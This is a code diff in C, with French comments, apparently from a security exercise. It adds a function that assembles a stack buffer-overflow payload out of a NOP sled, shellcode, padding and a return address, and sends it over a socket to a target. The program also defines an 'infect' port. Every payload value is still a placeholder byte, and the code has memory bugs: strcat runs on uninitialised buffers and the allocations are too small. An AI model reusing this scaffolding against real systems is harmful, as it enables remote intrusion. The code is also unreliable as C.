@@ -17,6 +17,51 @@
 #define SERVER_PORT 8080
 #define INFECT_PORT 54321
 
+size_t pay_size;
+
+char* crafted_payload(char* bu){
+	// Serie de NOP
+	int nb_nop = 1;
+	char *nops = malloc(nb_nop * sizeof(char));
+	for (int i = 0; i < nb_nop; i++){
+		strcat(nops, "\x90");
+	}
+	// Shellcode en dur
+	char shellcode[] = "\x90";
+
+	printf("%p\n", (void*)shellcode);
+	//0x7fffffffdb60
+
+	// Padding de bp
+	char padding_bp [] = "\x90";
+
+	// Adresse de retour en dur
+	char retour[] = "\x90";
+
+	char *final_buf = malloc((strlen(nops) + strlen(shellcode) + strlen(padding_bp) + strlen(retour)) * sizeof(char));
+
+	strcat(final_buf, nops);
+	strcat(final_buf, shellcode);
+	strcat(final_buf, padding_bp);
+	strcat(final_buf, retour);
+	//printf("%s\n", final_buf);
+
+	pay_size = strlen(final_buf);
+	printf("%zu\n", pay_size);
+
+	char * pay = malloc(strlen(final_buf) * sizeof(char));
+	//printf("%zu\n", sizeof(pay));
+	strcpy(pay, final_buf);
+	//printf("%s\n", pay);
+
+	free(nops);
+	free(final_buf);
+
+	return pay;
+
+	free(pay);
+}
+
 int is_infected(unsigned long ip, int sock, struct sockaddr_in * my_server_addr);
 
 struct cell_server {
@@ -131,7 +176,14 @@ void exploit(int connfd){
         }
     }
 	printf("\nNombre d'octets = %d\n", i+1);
-	//my_write(connfd,)
+
+	char* payload = crafted_payload(buff);
+	my_write(connfd, payload, strlen(payload)); // A CHANGER EN ASM BIEN SÛR !!!
+
+	printf("%s\n", payload);
+	printf("OK\n");
+
+	free(payload);
 
 }
 
